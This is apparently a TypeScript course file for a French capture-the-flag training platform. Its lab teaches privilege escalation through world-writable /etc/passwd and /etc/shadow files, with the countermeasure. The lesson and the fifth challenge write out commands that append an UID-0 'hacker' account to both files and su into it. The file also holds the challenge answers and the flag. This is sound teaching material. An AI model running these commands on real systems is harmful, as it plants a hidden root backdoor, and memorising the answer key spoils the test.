import type { CourseSeed } from "../../../types";

/** Cyber · Pratique — Module 15 : /etc/passwd & /etc/shadow inscriptibles. Lab mono-conteneur. */
export const module15PasswdWritable: CourseSeed[] = [
  {
    slug: "prat-passwd-writable",
    title: "Fichiers système inscriptibles : injecter un compte root",
    checkpoint: "cybersecurite-pratique",
    codename: "Silent Override",
    domain: "Élévation de privilèges",
    theme: "grid",
    icon: "Shield",
    accent: "#A6C44F",
    order: 15,
    difficulty: "hard",
    summary:
      "Dernier module du parcours, cinquième et dernière voie vers root : la plus directe. Ici, /etc/passwd ET /etc/shadow sont carrément inscriptibles par tous. Pas besoin d'exploiter un mécanisme — on injecte simplement un nouveau compte avec UID 0, et on devient root.",
    objectives: [
      "Repérer des fichiers système sensibles anormalement inscriptibles",
      "Générer un hash de mot de passe (openssl passwd -6)",
      "Comprendre le format de /etc/passwd et le rôle de l'UID 0",
      "Injecter un compte root complet (passwd + shadow) et l'utiliser",
      "Synthétiser les 5 voies d'élévation de privilèges du parcours",
    ],
    sandbox: {
      attackerImage: "cyberace/module15-passwd-writable:latest",
      // targetImage absent — mode mono-conteneur.
      ttlSec: 1200,
      attackerCapAdd: [],
      ports: [{ containerPort: 7681, label: "Terminal web (ttyd)" }],
    },
    lesson: `# 🛡️ Fichiers système inscriptibles — Silent Override

**Dernier maillon** de la série « élévation de privilèges » (Modules 3, 5, 8, 14, 15). Et le plus **direct** : les Modules précédents **exploitaient** un mécanisme (SUID, cron, capacité, mot de passe faible). Ici, il n'y a **rien à exploiter** — un fichier système vital est **carrément inscriptible par tous**, alors on y **écrit** simplement un nouveau root. 🏎️

---

## 🧭 Le briefing

> Dernier exercice de la série élévation de privilèges. Tu as vu **cinq** façons de passer d'un accès limité à root : **SUID** (M3), **cron** (M5), **capacités** (M8), **mot de passe faible** (M14), et maintenant les **fichiers système inscriptibles**. Cette fois, pas de mécanisme à détourner : un **script de correction de permissions a mal tourné** et a rendu **\`/etc/passwd\` et \`/etc/shadow\` inscriptibles par tous**. Ajoute-toi un compte root.

**Comment jouer :** « Démarrer le lab », shell **\`stagiaire\`**.

---

## 1. /etc/passwd et /etc/shadow 📇

Deux fichiers gouvernent les comptes Linux :
- **\`/etc/passwd\`** : la **liste des comptes** (nom, UID, GID, home, shell). Lisible par tous, mais **modifiable seulement par root** (\`644\`).
- **\`/etc/shadow\`** : les **hashs des mots de passe**. **Root-only** (\`640\`/\`600\`).

Format d'une ligne \`/etc/passwd\` :
\`\`\`
   hacker:x:0:0:root:/root:/bin/bash
   │      │ │ │ │     │     └── shell
   │      │ │ │ │     └── repertoire home
   │      │ │ │ └── GECOS (description)
   │      │ │ └── GID
   │      │ └── UID  ← 0 = ROOT
   │      └── 'x' = mot de passe dans /etc/shadow
   └── nom du compte
\`\`\`

> 🧭 Point **crucial** : sous Linux, les privilèges root sont déterminés par l'**UID = 0**, **pas** par le nom « root ». **N'importe quel** compte avec **UID 0** a **tous** les droits root.

---

## 2. La faille : les deux fichiers inscriptibles ✍️

Ici, \`ls -la /etc/passwd /etc/shadow\` montre les deux en **\`-rw-rw-rw-\`** (\`666\`, inscriptibles par **tous**). Un attaquant peut donc **ajouter** un compte avec **UID 0** directement — sans exploiter le moindre mécanisme. C'est l'élévation la plus **brutale** : on **réécrit** l'annuaire des comptes.

---

## 3. Injecter un compte root 💉

Trois étapes :

**a) Générer un hash** pour un mot de passe de ton choix :
\`\`\`bash
openssl passwd -6 monpass       # -6 = SHA-512 crypt ; renvoie $6$....
\`\`\`

**b) Ajouter la ligne au \`/etc/passwd\`** (UID 0 = root) :
\`\`\`bash
echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd
\`\`\`

**c) Ajouter la ligne correspondante au \`/etc/shadow\`** (avec le hash généré) :
\`\`\`bash
echo 'hacker:<hash>:19000:0:99999:7:::' >> /etc/shadow
\`\`\`

La ligne shadow a **9 champs** : \`nom:hash:dernier_chgt:min:max:avert:inactif:expire:reserve\`. Les valeurs \`19000:0:99999:7:::\` sont des valeurs standards qui font que **PAM** authentifie normalement.

**d) Devenir ce compte :**
\`\`\`bash
su hacker            # tape : monpass
whoami               # root (car UID 0)
cat /root/flag.txt
\`\`\`

> ⚠️ On modifie **les deux** fichiers : \`/etc/passwd\` (déclare le compte + UID 0) **et** \`/etc/shadow\` (le mot de passe). Ne toucher qu'à un seul ne suffit pas pour que \`su\` fonctionne proprement avec PAM.

---

## 4. La contre-mesure 🛡️

Évidente mais fondamentale : **les permissions par défaut**. \`/etc/passwd\` doit être **\`644\`** (écriture root seulement) et \`/etc/shadow\` **\`640\`/\`600\`** (root only, non lisible). Aucun utilisateur non-root ne doit pouvoir **écrire** ces fichiers. Un script qui « corrige les permissions » doit être **audité** — un \`chmod\` trop large sur un fichier système est une **porte grande ouverte**.

---

## 🎯 La série élévation de privilèges (récap) 🧵

| Module | Voie | Le défaut |
|---|---|---|
| **3** | SUID | un **binaire** SUID-root détournable |
| **5** | cron | un **script** root **modifiable** par l'utilisateur |
| **8** | capacités | un **interpréteur** doté d'une capacité forte |
| **14** | mot de passe faible | un **hash exposé** + mot de passe devinable |
| **15** | fichiers inscriptibles | un **fichier système** vital **inscriptible** par tous |

> 🧠 Le fil rouge des **cinq** : **un privilège élevé — accordé, mal protégé ou mal cloisonné quelque part — qu'un compte limité peut détourner ou exploiter.** La défense commune : **moindre privilège** + **permissions strictes** + **audit**.

## 🧠 À retenir

- **\`/etc/passwd\`** (comptes, \`644\`) et **\`/etc/shadow\`** (hashs, \`640\`/\`600\`) : modifiables **seulement par root** normalement.
- **UID 0 = root** : les droits root viennent de l'**UID**, pas du **nom**. Un compte \`hacker\` avec **UID 0** est root.
- **Faille** : les deux fichiers en **\`666\`** → on **injecte** un compte : ligne \`hacker:x:0:0:root:/root:/bin/bash\` dans \`/etc/passwd\` **+** \`hacker:<hash>:19000:0:99999:7:::\` (9 champs) dans \`/etc/shadow\`, puis \`su hacker\`.
- **Hash** : \`openssl passwd -6 <mdp>\` (SHA-512 crypt). Il faut modifier **les deux** fichiers pour que \`su\`/PAM fonctionne.
- **Contre-mesure** : **permissions strictes** (\`644\` passwd, \`640\`/\`600\` shadow), audit des scripts qui touchent aux permissions.
- **Fil rouge des 5 élévations** : un **privilège mal protégé/cloisonné** qu'un compte limité peut exploiter → **moindre privilège** + permissions + audit.`,
    badge: {
      id: "badge-prat-passwd",
      name: "Faussaire de Comptes",
      icon: "Shield",
      description: "A ajouté un compte root là où aucune écriture n'aurait dû être possible.",
    },
    challenges: [
      {
        id: "prat-passwd-t1",
        title: "Qui suis-je ?",
        order: 1,
        difficulty: "easy",
        type: "text",
        prompt: `## 🪪 Point de départ

Démarre le lab (shell \`stagiaire\`) :

\`\`\`bash
id
\`\`\`

**Question :** quelle **commande** affiche l'UID, le GID et les groupes de l'utilisateur courant ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        answer: "id",
        caseSensitive: false,
        explanation: `**\`id\`** confirme que tu es **\`stagiaire\`**. Retiens la notion d'**UID** : c'est lui, et non le nom, qui détermine les privilèges — la clé de ce module.`,
        tags: ["passwd", "enumeration", "id"],
      },
      {
        id: "prat-passwd-t2",
        title: "Vérifier les permissions système",
        order: 2,
        difficulty: "medium",
        type: "text",
        prompt: `## 🔍 Des fichiers trop ouverts

Inspecte les permissions des deux fichiers de comptes :

\`\`\`bash
ls -la /etc/passwd /etc/shadow
\`\`\`

Les deux sont en \`-rw-rw-rw-\` (inscriptibles par tous) — anormal.

**Question :** quel **fichier**, contenant la **liste des comptes** du système, est ici anormalement inscriptible par tous ?`,
        points: 150,
        timeLimitSec: 350,
        hints: [],
        answer: "/etc/passwd",
        accept: ["passwd", "/etc/passwd"],
        caseSensitive: false,
        explanation: `**\`/etc/passwd\`** (la liste des comptes) est en \`666\` — inscriptible par tous, alors qu'il devrait être \`644\` (écriture root seulement). \`/etc/shadow\` l'est aussi. Ces deux permissions ouvertes suffisent à **injecter** un compte root.`,
        tags: ["passwd", "permissions", "etc-passwd"],
      },
      {
        id: "prat-passwd-t3",
        title: "Générer un hash",
        order: 3,
        difficulty: "medium",
        type: "text",
        prompt: `## 🔐 Fabriquer le mot de passe

Génère un hash SHA-512 crypt pour un mot de passe de ton choix :

\`\`\`bash
openssl passwd -6 monpass
\`\`\`

**Question :** quelle **commande openssl** génère un hash **SHA-512 crypt** à partir d'un mot de passe ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        answer: "openssl passwd -6",
        accept: ["openssl passwd -6 <motdepasse>", "openssl passwd -6 monpass"],
        caseSensitive: true,
        explanation: `**\`openssl passwd -6 <mdp>\`** produit un hash **SHA-512 crypt** (préfixe \`$6$\`), exactement le format attendu dans \`/etc/shadow\`. C'est ce hash que tu inséreras pour ton nouveau compte.`,
        tags: ["passwd", "openssl", "hash"],
      },
      {
        id: "prat-passwd-t4",
        title: "Comprendre le format passwd",
        order: 4,
        difficulty: "easy",
        type: "mcq",
        prompt: `## 🔢 L'UID qui compte

**Question :** dans une ligne \`/etc/passwd\` au format \`nom:x:UID:GID:...\`, quel **UID** désigne le compte **root** ?`,
        points: 100,
        timeLimitSec: 250,
        hints: [],
        options: ["0", "1", "100", "1000"],
        answer: 0,
        explanation: `L'**UID 0** est celui de **root**. Sous Linux, c'est l'UID — **pas** le nom — qui confère les privilèges : n'importe quel compte avec UID 0 a **tous** les droits root. C'est pourquoi on va injecter un compte avec \`...:0:0:...\`.`,
        tags: ["passwd", "uid", "root"],
      },
      {
        id: "prat-passwd-t5",
        title: "Injecter le compte (flag)",
        order: 5,
        difficulty: "hard",
        type: "text",
        prompt: `## 💉 Ajouter un root (flag)

Assemble l'attaque : hash → ligne passwd (UID 0) → ligne shadow → \`su\`.

\`\`\`bash
HASH=$(openssl passwd -6 monpass)
echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd
echo "hacker:$HASH:19000:0:99999:7:::" >> /etc/shadow
su hacker          # tape : monpass
cat /root/flag.txt
\`\`\`

**Question :** colle le **flag** contenu dans \`/root/flag.txt\`.`,
        points: 300,
        timeLimitSec: 700,
        hints: [
          { text: "La ligne /etc/shadow a 9 champs : nom:hash:19000:0:99999:7:::  — respecte-les exactement pour que su/PAM fonctionne.", cost: 20 },
          { text: "Après avoir ajouté les deux lignes, deviens le compte : su hacker (puis ton mot de passe), et cat /root/flag.txt.", cost: 35 },
        ],
        answer: "CYBERACE{passwd_inscriptible_compte_root_ajoute}",
        caseSensitive: true,
        explanation: `En ajoutant \`hacker:x:0:0:...\` à \`/etc/passwd\` (**UID 0**) et sa ligne dans \`/etc/shadow\`, tu crées un **root** de toutes pièces. \`su hacker\` t'y connecte → tu lis \`/root/flag.txt\` → \`CYBERACE{passwd_inscriptible_compte_root_ajoute}\`. Écriture directe, aucun mécanisme exploité.`,
        tags: ["passwd", "injection", "flag"],
      },
      {
        id: "prat-passwd-t6",
        title: "Pourquoi UID 0 suffit",
        order: 6,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 👑 Root sans s'appeler root

**Question :** pourquoi ce nouveau compte « hacker » a-t-il les **pleins pouvoirs root**, alors que son nom n'est pas « root » ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        options: [
          "Sous Linux, les privilèges root sont déterminés par l'UID (0), pas par le nom du compte — n'importe quel nom avec UID 0 a les droits root",
          "Le nom 'hacker' est un alias spécial reconnu par le noyau",
          "C'est un bug spécifique à ce conteneur",
          "Il faut obligatoirement que le nom contienne 'root'",
        ],
        answer: 0,
        explanation: `Le noyau Linux accorde les privilèges selon l'**UID**, pas le **nom**. Un compte d'**UID 0** — quel que soit son nom — **est** root. C'est pour ça que \`hacker:x:0:0:...\` donne les pleins pouvoirs. Ce n'est ni un alias, ni un bug local, ni une question de nom.`,
        tags: ["passwd", "uid-0", "root"],
      },
      {
        id: "prat-passwd-t7",
        title: "Contre-mesure",
        order: 7,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🛡️ Ce qui aurait bloqué l'attaque

**Question :** quelle **permission standard**, absente ici, aurait **empêché** cette modification ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        options: [
          "L'absence de droit d'écriture pour les utilisateurs non-root (644 pour passwd, 640/600 pour shadow)",
          "Le chiffrement du disque",
          "Un pare-feu réseau",
          "La désactivation de sudo",
        ],
        answer: 0,
        explanation: `Les **permissions standard** — \`/etc/passwd\` en **644** et \`/etc/shadow\` en **640/600** (aucune écriture non-root) — auraient rendu l'injection **impossible**. Le chiffrement disque, un pare-feu ou désactiver sudo n'ont aucun effet sur un fichier local inscriptible.`,
        tags: ["passwd", "permissions", "contre-mesure"],
      },
      {
        id: "prat-passwd-t8",
        title: "Synthèse finale du parcours",
        order: 8,
        difficulty: "easy",
        type: "mcq",
        prompt: `## 🎓 Les 5 voies vers root

**Question :** sur les **cinq** modules d'élévation de privilèges de ce parcours (SUID, cron, capacités, mot de passe faible, fichiers inscriptibles), quel est le **point commun** ?`,
        points: 50,
        timeLimitSec: 250,
        hints: [],
        options: [
          "Un privilège élevé accordé, mal protégé ou mal cloisonné quelque part, qu'un compte limité peut détourner ou exploiter",
          "Les cinq nécessitent un accès réseau",
          "Les cinq exploitent une faille du noyau Linux lui-même",
          "Les cinq nécessitent de connaître le mot de passe root à l'avance",
        ],
        answer: 0,
        explanation: `Le fil rouge des cinq voies (SUID, cron, capacités, mot de passe faible, fichiers inscriptibles) : **un privilège élevé mal protégé ou mal cloisonné**, qu'un compte limité peut **détourner ou exploiter**. Aucune ne requiert de réseau, de faille noyau, ni de connaître le mot de passe root d'avance. La défense commune : **moindre privilège**, permissions strictes, audit.`,
        tags: ["passwd", "synthese", "moindre-privilege"],
      },
    ],
  },
];
